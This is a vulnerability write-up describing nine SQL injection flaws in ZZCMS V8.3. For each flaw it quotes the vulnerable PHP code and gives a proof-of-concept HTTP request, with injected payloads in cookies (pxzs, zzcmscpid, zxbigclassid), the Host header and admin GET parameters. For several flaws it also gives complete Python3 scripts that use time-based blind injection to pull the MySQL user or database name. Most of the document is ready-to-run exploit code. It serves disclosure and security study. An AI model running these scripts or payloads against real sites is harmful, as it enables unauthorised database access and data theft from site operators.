# ZZCMS V8.3 SQL Injections

------

## 1. SQL Injection in zs/zs.php with parameter $px

the following code got $px from cookie without any checking bettween line 10  and 18

```php
if (isset($_GET["px"])){
$px=$_GET["px"];
	if ($px!='hit' && $px!='id' && $px!='sendtime'){
	$px="sendtime";
	}
setcookie("pxzs",$px,time()+3600*24*360);
}else{
$px=isset($_COOKIE['pxzs'])?$_COOKIE['pxzs']:"sendtime";
}
```

and $px used in the following code to query in mysql bettween 229 and 233

```php
$sql="select id,proname,prouse,img,shuxing_value,province,city,xiancheng,sendtime,editor,elite,userid,comane,qq,groupid,renzheng from zzcms_main where passed=1 ";
$sql=$sql.$sql2;
$sql=$sql." order by groupid desc,elite desc,".$px." desc limit $offset,$page_size";
//echo $sql;
$rs = query($sql); 
```

 so attack could make poc like:

```http
GET /zs/zs.php?province=&sj=999&b=&s=&menu2=&menu1= HTTP/1.1
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: pxzs=(SELECT(1)FROM(SELECT(SLEEP((3-length(database()))*3)))nFXY)


```

the python3 poc as following:

```python
#/usr/local/bin/python3
# -*-coding:utf-8-*-
 
import requests
import time

def zs_sqli(host):
    payloads = '-.@_abcdefghijklmnopqrstuvwxyz0123456789{}'
     
    result = ""

    headers = {"Host": host,
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               }
    cookies = {"bdshare_firstime":"", "PHPSESSID":"", "UserName":"", "PassWord":""}
    url = "http://%s/zs/zs.php?province=&sj=999&b=&s=&menu2=&menu1=" % host
    #proxies = {"http":"http://127.0.0.1:8080"}
    proxies = ""
    rlen = 0

    print("Start\n")

    for i in range(1,100):
        pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-length(user()))*1)))nFXY)" %i
        cookies["pxzs"] = pxzs
        starttime = time.time()

        res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
        if time.time() - starttime > 1:
            rlen = i - 1
            print("the length of user is : %d\n" %rlen)
            break

    for j in range(1, rlen+1):
        for payload in payloads:
            char = ord(payload) + 1
            starttime = time.time()
            pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-(select conv(hex(mid(user(),%d,1)),16,10)))*1)))nFXY)" %(char, j)
            cookies["pxzs"] = pxzs
            res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
            if time.time() - starttime > 1:
                result += payload
                print('current user is:', result)
                break
            else:
                pass
    print('\n[Finally] current user is %s' % result)

if __name__ == '__main__':
    host = '172.18.120.76'
    zs_sqli(host)    

```

got the mysql current user as:

![image-20180915203543131](/Users/kunkun/Library/Application Support/typora-user-images/image-20180915203543131.png)



------

## 2. SQL Injection in zs/search.php with parameter $px

the following code got $px from cookie without any checking bettween line 8  and 20

```php
if (isset($_GET["px"])){
$px=$_GET["px"];
	if ($px!='hit' && $px!='id' && $px!='sendtime'){
	$px="sendtime";
	}
setcookie("pxzs",$px,time()+3600*24*360);
}else{
	if (isset($_COOKIE["pxzs"])){
	$px=$_COOKIE["pxzs"];
	}else{
	$px="sendtime";
	}
}
```

and $px used in the following code to query in mysql bettween 403 and 407

```php
$sql="select id,proname,prouse,shuxing_value,img,province,city,xiancheng,sendtime,editor,elite,userid,comane,qq,groupid,renzheng,tag from zzcms_main where passed=1 ";
$sql=$sql.$sql2;
$sql=$sql." order by groupid desc,elite desc,".$px." desc limit $offset,$page_size";
//echo $sql;
$rs = query($sql); 
```

 so attack could make poc like:

```http
GET /zs/search.php HTTP/1.1
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: pxzs=(SELECT(1)FROM(SELECT(SLEEP((3-length(database()))*3)))abcd)


```

the python3 poc as following:

```python
#/usr/local/bin/python3
# -*-coding:utf-8-*-
 
import requests
import time

def zs_sqli(host):
    payloads = '-.@_abcdefghijklmnopqrstuvwxyz0123456789{}'
     
    result = ""

    headers = {"Host": host,
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               }
    cookies = {"bdshare_firstime":"", "PHPSESSID":"", "UserName":"", "PassWord":""}
    url = "http://%s/zs/search.php" % host
    #proxies = {"http":"http://127.0.0.1:8080"}
    proxies = ""
    rlen = 0

    print("Start\n")

    for i in range(1,100):
        pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-length(database()))*1)))abcd)" %i
        cookies["pxzs"] = pxzs
        starttime = time.time()

        res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
        if time.time() - starttime > 1:
            rlen = i - 1
            print("the length of current database is : %d\n" %rlen)
            break

    for j in range(1, rlen+1):
        for payload in payloads:
            char = ord(payload) + 1
            starttime = time.time()
            pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-(select conv(hex(mid(database(),%d,1)),16,10)))*1)))abcd)" %(char, j)
            cookies["pxzs"] = pxzs
            res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
            if time.time() - starttime > 1:
                result += payload
                print('current database is:', result)
                break
            else:
                pass
    print('\n[Finally] current database is %s' % result)

if __name__ == '__main__':
    host = '172.18.120.76'
    zs_sqli(host)    

```

got the mysql current db as following:

![image-20180915210311562](/Users/kunkun/Library/Application Support/typora-user-images/image-20180915210311562.png)

------

## 3. SQL Injection in ajax/zs.php with parameter $px

the following code got $px from cookie without any checking in line 8

```php
$px = isset($_COOKIE['pxzs'])?$_COOKIE['pxzs']:"sendtime";
```

and $px used in the following code to query in mysql bettween 43 and 45

```php
$sql=$sql." order by groupid desc,elite desc,".$px." desc limit $last,$amount";
//echo $sql;
$rs = query($sql); 
```

 so attack could make poc like:

```http
GET /ajax/zs.php HTTP/1.1
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: pxzs=(SELECT(1)FROM(SELECT(SLEEP((3-length(database()))*3)))abcd)


```

the python3 poc as following:

```python
#/usr/local/bin/python3
# -*-coding:utf-8-*-
 
import requests
import time

def zs_sqli(host):
    payloads = '-.@_abcdefghijklmnopqrstuvwxyz0123456789{}'
     
    result = ""

    headers = {"Host": host,
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               }
    cookies = {"bdshare_firstime":"", "PHPSESSID":"", "UserName":"", "PassWord":""}
    url = "http://%s/ajax/zs.php" % host
    #proxies = {"http":"http://127.0.0.1:8080"}
    proxies = ""
    rlen = 0

    print("Start\n")

    for i in range(1,100):
        pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-length(user()))*1)))abcd)" %i
        cookies["pxzs"] = pxzs
        starttime = time.time()

        res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
        if time.time() - starttime > 1:
            rlen = i - 1
            print("the length of current user is : %d\n" %rlen)
            break

    for j in range(1, rlen+1):
        for payload in payloads:
            char = ord(payload) + 1
            starttime = time.time()
            pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-(select conv(hex(mid(user(),%d,1)),16,10)))*1)))abcd)" %(char, j)
            cookies["pxzs"] = pxzs
            res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
            if time.time() - starttime > 1:
                result += payload
                print('current user is:', result)
                break
            else:
                pass
    print('\n[Finally] current user is %s' % result)

if __name__ == '__main__':
    host = '172.18.120.76'
    zs_sqli(host)    
```

got the mysql current user as following:

![image-20180915231147488](/Users/kunkun/Library/Application Support/typora-user-images/image-20180915231147488.png)

------

## 4. SQL Injection in zs/zs_list.php with parameter $px

the following code got $px from cookie without any checking bettween line 12  and 20

```php
if (isset($_GET["px"])){
$px=$_GET["px"];
	if ($px!='hit' && $px!='id' && $px!='sendtime'){
	$px="sendtime";
	}
setcookie("pxzs",$px,time()+3600*24*360);
}else{
$px=isset($_COOKIE['pxzs'])?$_COOKIE['pxzs']:"sendtime";
}
```

and $px used in the following code to query in mysql bettween 299 and 302

```php
$sql="select id,proname,prouse,shuxing_value,img,province,city,xiancheng,sendtime,editor,elite,userid,comane,qq,groupid,renzheng from zzcms_main where passed=1 ";	
$sql=$sql.$sql2;
$sql=$sql." order by groupid desc,elite desc,".$px." desc limit $offset,$page_size";
$rs = query($sql); 
```

 so attack could make poc like:

```http
GET /zs/zs_list.php HTTP/1.1
Cookie: pxzs=(SELECT(1)FROM(SELECT(SLEEP((3-length(database()))*3)))abcd);
Connection: close
```

the python3 poc as following:

```python
#/usr/local/bin/python3
# -*-coding:utf-8-*-
 
import requests
import time

def zs_sqli(host):
    payloads = '-.@_abcdefghijklmnopqrstuvwxyz0123456789{}'
     
    result = ""

    headers = {"Host": host,
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               }
    cookies = {"bdshare_firstime":"", "PHPSESSID":"", "UserName":"", "PassWord":""}
    url = "http://%s/zs/zs_list.php" % host
    #proxies = {"http":"http://127.0.0.1:8080"}
    proxies = ""
    rlen = 0

    print("Start\n")

    for i in range(1,100):
        pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-length(user()))*1)))abcd)" %i
        cookies["pxzs"] = pxzs
        starttime = time.time()

        res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
        if time.time() - starttime > 1:
            rlen = i - 1
            print("the length of current user is : %d\n" %rlen)
            break

    for j in range(1, rlen+1):
        for payload in payloads:
            char = ord(payload) + 1
            starttime = time.time()
            pxzs = "(SELECT(1)FROM(SELECT(SLEEP((%d-(select conv(hex(mid(user(),%d,1)),16,10)))*1)))abcd)" %(char, j)
            cookies["pxzs"] = pxzs
            res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
            if time.time() - starttime > 1:
                result += payload
                print('current user is:', result)
                break
            else:
                pass
    print('\n[Finally] current user is %s' % result)

if __name__ == '__main__':
    host = '172.18.120.76'
    zs_sqli(host)    

```

got the mysql current user as following:

![image-20180915231931575](/Users/kunkun/Library/Application Support/typora-user-images/image-20180915231931575.png)

------

## 5. SQL Injecton in zs/subzs.php with COOKIE zzcmscpid

first find an sql expression in zs/subzs.php useing zzcmscpid of cookie without any checking:

bettween line 12 and 20 in function showcookiezs()

```php
$cpid=$_COOKIE["zzcmscpid"];
	if (strpos($cpid,",")>0){
		$cpid=str_replace(" ","",$cpid);
		$cpid=str_replace("deleted","",$cpid);//cookie会出现deleted的情况
		$sql="select id,proname,img from zzcms_main where id in (".$cpid.")";
	}else{
	checkid($cpid);
	$sql="select id,proname,img from zzcms_main where id='$cpid' ";
	}
```



the function showcookiezs() is using another function fixed() 'case cookiezs': which in label.php 

```php
function fixed($cs,$channel){
switch ($channel){
case 'ad':return showad($cs); break;
case 'zs':return showzs($cs); break;
case 'dl':return showdl($cs); break;
case 'pp':return showpp($cs); break;
case 'job':return showjob($cs); break;
case 'zx':return showzx($cs); break;
case 'zh':return showzh($cs); break;
case 'announce':return showannounce($cs); break;
case 'cookiezs':return showcookiezs($cs); break;
case 'zsclass':return showzsclass($cs); break;
case 'keyword':return showkeyword($cs); break;
case 'province':return showprovince($cs); break;
case 'sitecount':return showsitecount($cs); break;
}
}
```

the function fixed() is using in showlabel() in label.php

```php
function showlabel($str){
global $b;
$channels=array('ad','zs','dl','zx','pp','job','zh','announce','cookiezs','zsclass','keyword','province','sitecount');
foreach ($channels as $value) {
if (strpos($str,"{#show".$value.":")!==false){
$n=count(explode("{#show".$value.":",$str));
	for ($i=1;$i<$n;$i++){ 
	$cs=strbetween($str,"{#show".$value.":","}");
	if ($cs<>''){$str=str_replace("{#show".$value.":".$cs."}",fixed($cs,$value),$str);}	
	}	
}
}
```

and the funtion showlabel() and template zs_search.htm which contains cookiezs using in zs/search.php

```php
$fp="../template/".$siteskin."/zs_search.htm";
$f = fopen($fp,'r');
$strout = fread($f,filesize($fp));
fclose($f);
...
$strout=showlabel($strout);
echo  $strout;		
```

so attacker could make poc like this:

use %0a to bypass str_replace %20 and '(' to close sql expression.

```http
GET /zs/search.php HTTP/1.1
Cookie: zzcmscpid=1,1) union%0aselect%0auser(),1,version(;
Connection: close

```

get the current user of mysql:

![image-20180915224537685](/Users/kunkun/Library/Application Support/typora-user-images/image-20180915224537685.png)

------

## 6. SQL Injecton in admin/classmanage.php with SESSION tablename [need admin user login]

first find an sql expression in admin/classmanage.php using $_GET parameter tablename without any checking:

bettween line 1 and 5 in classmanage.php

```php
<?php
include("admin.php");
if (isset($_GET['tablename'])){
$_SESSION['tablename']=$_GET['tablename'];
}
```

the function showtag() has execute the sick sql expression bettween line 47 and 51:

```php
function showtag(){
$action=isset($_REQUEST['action'])?$_REQUEST['action']:'';
if ($action=="px") {
$sql="Select * From ".$_SESSION['tablename']."";
$rs=query($sql);
```

so attacker could make poc like this:

```http
GET /admin/classmanage.php?action=px&tablename=zzcms_wangkanclass%20union%20select%20user(),version(),database() HTTP/1.1
Cookie: UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6; PHPSESSID=nm1mojm251p2urj1d36nlvrqk6
Connection: close

```

get the current user of mysql:

![image-20180916004242561](/Users/kunkun/Library/Application Support/typora-user-images/image-20180916004242561.png)

------

## 7. SQL Injecton in admin/special_add.php with COOKIE zxbigclassid [need admin user login]

find an sql expression in admin/special_add.php using $_COOKIE parameter zxbigclassid without any checking:

bettween line 133 and 135 in special_add.php

```php
if ($_COOKIE["zxbigclassid"]!=""){
$sql="select * from zzcms_zxclass where parentid=" .$_COOKIE["zxbigclassid"]." order by xuhao asc";
$rs=query($sql);
```

so attacker could make poc like this:

```http
GET /admin/special_add.php HTTP/1.1
Cookie: bdshare_firstime=1536977468290; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6; PHPSESSID=nm1mojm251p2urj1d36nlvrqk6;zxbigclassid=1111%20union%20select%200,user(),2,3,4,5,6,7,8,9;
Connection: close

```

get the current user of mysql:

![image-20180916005759115](/Users/kunkun/Library/Application Support/typora-user-images/image-20180916005759115.png)

------

## 8. SQL Injecton in admin/tagmanage.php with SESSION tabletag [need admin user login]

first find an sql expression in admin/tagmanage.php using $_GET parameter tabletag without any checking:

bettween line 1 and 5 in tagmanage.php

```php
<?php
include("admin.php");
if (isset($_GET['tabletag'])){
$_SESSION['tabletag']=$_GET['tabletag'];
}
```

the page has execute the sick sql expression bettween line 47 and 51:

```php
if ($action=="px") {
$sql="Select * From ".$_SESSION['tabletag']."";
$rs=query($sql);
```

so attacker could make poc like this:

```http
GET /admin/tagmanage.php?tabletag=zzcms_tagzx%20union%20select%201,2,user(),4 HTTP/1.1
Cookie: UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6; PHPSESSID=nm1mojm251p2urj1d36nlvrqk6
Connection: close

```

get the current user of mysql:

![image-20180916010415143](/Users/kunkun/Library/Application Support/typora-user-images/image-20180916010415143.png)

------

## 9. SQL Injection in zt/top.php with HTTP_HOST

the following code using  $_SERVER['HTTP_HOST'] in sql expression without any checking bettween line 1  and 6

```php
<?php
//echo $_SERVER['REQUEST_URI'];
$editor=isset($_REQUEST['editor'])?$_REQUEST['editor']:'';
$editor=substr($_SERVER['HTTP_HOST'],0,strpos($_SERVER['HTTP_HOST'],'.'));
$rs=query("select * from zzcms_userdomain where domain='".$_SERVER['HTTP_HOST']."' and passed=1 and del=0");
$row=num_rows($rs);
```

the zt/top.php cannot be access directly, we should access another page such as zt/news.php which include top.php

```php
<?php
include("../inc/conn.php");
include("../inc/fy.php");
include("top.php");
include("bottom.php");
include("left.php");

$fp="../skin/".$skin."/news.htm";
if (file_exists($fp)==false){
```

 so attack could make poc like:

```http
GET /zt/news.php?id=1 HTTP/1.1
Host: aaa' union select 1,2,3,4,(select if(user()='root@localhost',sleep(1),1)) #
```

the python3 poc as following:

```python
#/usr/local/bin/python3
# -*-coding:utf-8-*-
 
import requests
import time

def zs_sqli(host):
    payloads = '-.@_abcdefghijklmnopqrstuvwxyz0123456789{}'
     
    result = ""

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               }
    cookies = {"bdshare_firstime":"", "PHPSESSID":"", "UserName":"", "PassWord":""}
    url = "http://%s/zt/news.php" % host
    #proxies = {"http":"http://127.0.0.1:8080"}
    proxies = ""
    rlen = 0

    print("Start\n")

    for i in range(1,100):
        hosti = "aaa' union select 1,2,3,4,(select if(length(user())=%d,sleep(1),1)) #" %i
        headers["HOST"] = hosti
        starttime = time.time()

        res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
        if time.time() - starttime > 1:
            rlen = i
            print("the length of current user is : %d\n" %rlen)
            break

    for j in range(1, rlen+1):
        for payload in payloads:
            char = ord(payload)
            starttime = time.time()
            hosti = "aaa' union select 1,2,3,4,(select if(mid(user(),%d,1)='%s',sleep(1),1)) #" %(j,payload)
            headers["HOST"] = hosti
            res = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
            if time.time() - starttime > 1:
                result += payload
                print('current user is:', result)
                break
            else:
                pass
    print('\n[Finally] current user is %s' % result)

if __name__ == '__main__':
    host = '172.18.120.76'
    zs_sqli(host)    

```

got the mysql current user as:

![image-20180916015727597](/Users/kunkun/Library/Application Support/typora-user-images/image-20180916015727597.png)



------

##  

